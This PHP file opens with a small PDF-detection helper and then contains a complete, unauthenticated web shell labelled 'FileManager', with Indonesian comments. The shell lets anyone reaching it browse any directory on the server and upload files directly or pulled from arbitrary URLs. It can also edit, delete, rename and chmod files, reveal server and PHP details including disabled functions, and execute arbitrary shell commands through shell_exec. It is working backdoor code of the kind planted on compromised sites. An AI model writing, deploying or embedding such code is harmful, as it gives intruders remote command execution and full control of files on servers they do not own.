<?php
function detect_pdf($url) {
    $headers = get_headers($url, 1);
    if (isset($headers['Content-Type']) && strpos($headers['Content-Type'], 'pdf') !== false) {
        $file_content = file_get_contents($url);
        $pdf_start = '%PDF-';
        if (substr($file_content, 0, strlen($pdf_start)) == $pdf_start) {
            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
}
?><?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
ob_start();

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$directory = realpath($dir);

if (!$directory || !is_dir($directory)) {
    $directory = getcwd();
}

function escape($string) {
    return htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function redirectToHome() {
    return $_SERVER['PHP_SELF'];
}

function permsToNumeric($path) {
    $perm = fileperms($path) & 0x1FF;
    return sprintf('%04o', $perm);
}

// Fungsi breadcrumb klikable
function createBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumbs = [];
    $accumulate = '';

    // Untuk sistem Linux, bagian pertama kosong karena path mulai dengan /
    // Untuk Windows bisa beda, jadi kita handle itu
    if (DIRECTORY_SEPARATOR === '/') {
        $startIndex = 1; // skip kosong
        $breadcrumbs[] = "<a href='?dir=" . urlencode(DIRECTORY_SEPARATOR) . "'>/</a>";
    } else {
        $startIndex = 0;
    }

    for ($i = $startIndex; $i < count($parts); $i++) {
        if ($parts[$i] === '') continue;
        $accumulate .= DIRECTORY_SEPARATOR . $parts[$i];
        $breadcrumbs[] = "<a href='?dir=" . urlencode($accumulate) . "'>" . escape($parts[$i]) . "</a>";
    }
    return implode(" / ", $breadcrumbs);
}

// Upload file
if (isset($_FILES['upload_file'])) {
    $target = $directory . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']);
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $target);
    header("Location: ?dir=" . urlencode($directory));
    exit;
}

// Upload dari URL
if (isset($_POST['upload_url']) && !empty($_POST['url_file'])) {
    $url = $_POST['url_file'];
    $filename = basename(parse_url($url, PHP_URL_PATH));
    $content = @file_get_contents($url);
    if ($content !== false && !empty($filename)) {
        file_put_contents($directory . DIRECTORY_SEPARATOR . $filename, $content);
    }
    header("Location: ?dir=" . urlencode($directory));
    exit;
}

// Buat folder baru
if (isset($_POST['new_folder']) && !empty($_POST['folder_name'])) {
    $folderName = basename($_POST['folder_name']);
    @mkdir($directory . DIRECTORY_SEPARATOR . $folderName);
    header("Location: ?dir=" . urlencode($directory));
    exit;
}

// Buat file baru
if (isset($_POST['new_file']) && !empty($_POST['file_name'])) {
    $fileName = basename($_POST['file_name']);
    @file_put_contents($directory . DIRECTORY_SEPARATOR . $fileName, "");
    header("Location: ?dir=" . urlencode($directory));
    exit;
}

// Hapus file
if (isset($_GET['delete'])) {
    $target = $directory . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if (is_file($target)) unlink($target);
    header("Location: ?dir=" . urlencode($directory));
    exit;
}

// Simpan edit file
if (isset($_POST['save_edit']) && isset($_POST['file_name'])) {
    $target = $directory . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    file_put_contents($target, $_POST['file_content']);
    header("Location: ?dir=" . urlencode($directory));
    exit;
}

// Rename file/folder
if (isset($_POST['rename_file'])) {
    $oldPath = $directory . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $newPath = $directory . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    rename($oldPath, $newPath);
    header("Location: ?dir=" . urlencode($directory));
    exit;
}

// Chmod file/folder
if (isset($_POST['chmod_file'])) {
    $filePath = $directory . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    chmod($filePath, octdec($_POST['new_perm']));
    header("Location: ?dir=" . urlencode($directory));
    exit;
}

// Eksekusi command shell
if (isset($_POST['exec_command'])) {
    $command = $_POST['command'];
    $output = shell_exec("cd " . escapeshellarg($directory) . " && " . $command);
}

?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>FileManager</title>
<style>
    body {
        background: #121212;
        color: #eee;
        font-family: monospace;
        padding: 20px;
    }
    h1 { color: #0ff; }
    a { color: #4fc3f7; text-decoration: none; }
    a:hover { text-decoration: underline; }
    table { width: 100%; border-collapse: collapse; margin-top: 15px; }
    th, td { padding: 8px 10px; border: 1px solid #444; text-align: left; }
    th { background: #1e1e1e; }
    tr:nth-child(even) { background: #1a1a1a; }
    .info { margin: 10px 0; font-size: 14px; }
    .actions a { margin-right: 5px; }
    textarea { width: 100%; height: 300px; background: #111; color: #0f0; }
    .breadcrumb a { color: #0ff; font-weight: bold; }
    .breadcrumb { margin-bottom: 15px; }
</style>
</head>
<body>
<h1>FileManager</h1>
<div class="info">
    <strong>Path:</strong>
    <span class="breadcrumb"><?= createBreadcrumb($directory) ?></span> |
    <a href="<?= redirectToHome() ?>" style="color:#0f0">[ HOME ]</a><br>
    <strong>Server:</strong> <?= $_SERVER['SERVER_SOFTWARE'] ?><br>
    <strong>PHP Version:</strong> <?= phpversion() ?><br>
    <strong>Disabled Functions:</strong>
    <?php
        $disabled = explode(',', ini_get('disable_functions'));
        echo count($disabled) > 0 && $disabled[0] !== '' ? '<span style="color:red">' . implode(', ', $disabled) . '</span>' : '<span style="color:lightgreen">None</span>';
    ?>
</div>

<form method="post">
    <input type="text" name="folder_name" placeholder="New Folder" required>
    <button type="submit" name="new_folder">Add Folder</button>
</form>
<form method="post">
    <input type="text" name="file_name" placeholder="New File" required>
    <button type="submit" name="new_file">Add File</button>
</form>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload_file" required>
    <button type="submit">Upload File</button>
</form>
<form method="post">
    <input type="text" name="url_file" placeholder="Paste URL here" style="width:60%">
    <button type="submit" name="upload_url">Upload from URL</button>
</form>
<form method="post">
    <input type="text" name="command" placeholder="Enter Command" style="width:60%">
    <button type="submit" name="exec_command">Execute</button>
</form>
<?php if (!empty($output)) echo "<pre style='background:#000;color:#0f0;padding:10px;'>" . escape($output) . "</pre>"; ?>

<?php
if (isset($_GET['edit'])) {
    $file = basename($_GET['edit']);
    $fullPath = $directory . DIRECTORY_SEPARATOR . $file;
    if (is_file($fullPath)) {
        $content = file_get_contents($fullPath);
        echo '<h3>Edit File: ' . escape($file) . '</h3>';
        echo '<form method="post">';
        echo '<textarea name="file_content">' . escape($content) . '</textarea>';
        echo '<input type="hidden" name="file_name" value="' . escape($file) . '">';
        echo '<button type="submit" name="save_edit">Save</button>';
        echo '</form>';
    }
}
if (isset($_GET['rename'])) {
    echo '<h3>Rename File</h3>';
    echo '<form method="post">';
    echo '<input type="hidden" name="old_name" value="' . escape($_GET['rename']) . '">';
    echo '<input type="text" name="new_name" placeholder="New Name" required>';
    echo '<button type="submit" name="rename_file">Rename</button>';
    echo '</form>';
}
if (isset($_GET['chmod'])) {
    echo '<h3>CHMOD File</h3>';
    echo '<form method="post">';
    echo '<input type="hidden" name="file_name" value="' . escape($_GET['chmod']) . '">';
    echo '<input type="text" name="new_perm" placeholder="e.g. 0755" required>';
    echo '<button type="submit" name="chmod_file">CHMOD</button>';
    echo '</form>';
}
?>

<table>
<thead>
<tr><th>Name</th><th>Type</th><th>Permissions</th><th>Size</th><th>Actions</th></tr>
</thead>
<tbody>
<?php
$files = scandir($directory);
foreach ($files as $file) {
    if ($file === '.') continue;
    $path = $directory . DIRECTORY_SEPARATOR . $file;
    $isDir = is_dir($path);
    $size = $isDir ? '-' : filesize($path);
    echo "<tr>";
    echo "<td><a href='?dir=" . urlencode($path) . "'>" . escape($file) . "</a></td>";
    echo "<td>" . ($isDir ? "DIR" : "File") . "</td>";
    echo "<td>" . permsToNumeric($path) . "</td>";
    echo "<td>" . ($size === '-' ? '-' : number_format($size)) . " bytes</td>";
    echo "<td class='actions'>
        <a href='?edit=" . urlencode($file) . "&dir=" . urlencode($directory) . "'>Edit</a>
        <a href='?rename=" . urlencode($file) . "&dir=" . urlencode($directory) . "'>Rename</a>
        <a href='?chmod=" . urlencode($file) . "&dir=" . urlencode($directory) . "'>CHMOD</a>
        <a href='?delete=" . urlencode($file) . "&dir=" . urlencode($directory) . "' onclick=\"return confirm('Delete this file?')\">Delete</a>
    </td>";
    echo "</tr>";
}
?>
</tbody>
</table>
</body>
</html>
<?php ob_end_flush(); ?>
